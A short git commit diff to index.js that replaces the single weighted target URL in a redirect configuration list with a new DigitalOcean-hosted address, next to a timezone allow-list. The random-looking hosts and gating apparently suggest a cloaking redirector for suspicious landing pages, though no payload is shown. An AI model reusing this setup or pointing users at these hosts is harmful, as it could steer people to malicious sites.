eed63f571bb4ba0890f5da56cd1fbf4243e0367c
paalakash <palaksh452@gmail.com>
2026-06-26 12:44:52 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sejhfuewferwe.on-forge.com/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://goldfish-app-s6w79.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
